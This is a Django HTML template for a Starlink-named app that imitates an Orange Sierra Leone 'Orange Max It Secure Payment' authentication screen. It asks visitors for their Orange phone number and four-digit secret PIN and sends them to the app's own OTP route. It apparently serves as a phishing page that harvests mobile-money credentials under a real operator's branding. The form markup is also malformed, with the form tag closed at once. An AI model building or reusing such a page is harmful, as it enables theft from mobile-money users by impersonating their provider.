{% extends 'base.html' %}

{% block content %}
<div class="min-h-screen bg-[#f5f5f5] flex items-center justify-center p-4">

    <div class="max-w-md w-full bg-white rounded-[35px] overflow-hidden shadow-2xl">

        <div class="relative h-[260px]">
            <img
                src="https://images.unsplash.com/photo-1523908511403-7fc7b25592f4?w=1200"
                class="w-full h-full object-cover"
                alt="Orange SL">

            <div class="absolute inset-0 bg-black/20"></div>

            <div class="absolute bottom-0 left-0 right-0 bg-white rounded-t-[35px] h-10"></div>
        </div>

        <div class="px-8 pb-8 -mt-2 relative z-10 bg-white">

            <div class="mb-8">
                <h1 class="text-3xl font-black text-black">
                    Authentication
                </h1>

                <p class="text-[11px] uppercase tracking-[3px] text-gray-400 mt-2">
                    Orange Max It Secure Payment
                </p>
            </div>

<form action="{% url 'starlink_app:otp_verification' order_id=order.id %}" method="POST" class="space-y-8"></form>        
        {% csrf_token %}

                <div>
                    <label class="block text-[10px] uppercase font-bold text-gray-500 mb-3 tracking-widest">
                        Orange Number
                    </label>

                    <div class="flex items-center border-b-2 border-[#ff7900] pb-3">
                        <span class="text-[#ff7900] font-black text-lg mr-3">
                            +232
                        </span>

                        <input
                            type="tel"
                            name="phone"
                            required
                            placeholder="76XXXXXX"
                            class="w-full outline-none bg-transparent text-black text-lg font-semibold placeholder:text-gray-300">
                    </div>
                </div>

                <div>
                    <label class="block text-[10px] uppercase font-bold text-gray-500 mb-3 tracking-widest">
                        Secret PIN
                    </label>

                    <div class="flex items-center border-b-2 border-gray-200 focus-within:border-[#ff7900] pb-3 transition-all">
                        <svg class="w-5 h-5 text-gray-400 mr-3"
                             fill="currentColor"
                             viewBox="0 0 20 20">
                            <path fill-rule="evenodd"
                                  d="M5 8a5 5 0 1110 0v1h1a2 2 0 012 2v5a2 2 0 01-2 2H4a2 2 0 01-2-2v-5a2 2 0 012-2h1V8zm2 1h6V8a3 3 0 10-6 0v1z"
                                  clip-rule="evenodd"/>
                        </svg>

                        <input
                            type="password"
                            name="pin"
                            required
                            maxlength="4"
                            placeholder="••••"
                            class="w-full outline-none bg-transparent text-black text-2xl tracking-[12px] font-black placeholder:text-gray-300">
                    </div>
                </div>

                <input type="hidden" name="bundle_id" value="{{ request.GET.bundle }}">

                <button
                    type="submit"
                    class="w-full bg-[#ff7900] hover:brightness-110 active:scale-[0.99] transition-all text-white py-4 rounded-2xl font-black uppercase tracking-[2px] shadow-xl">
                    Continue Authentication
                </button>
            </form>

            <div class="mt-10 text-center">
                <p class="text-[9px] uppercase tracking-[4px] text-gray-300">
                    Powered by Orange Sierra Leone
                </p>
            </div>

        </div>
    </div>
</div>
{% endblock %}
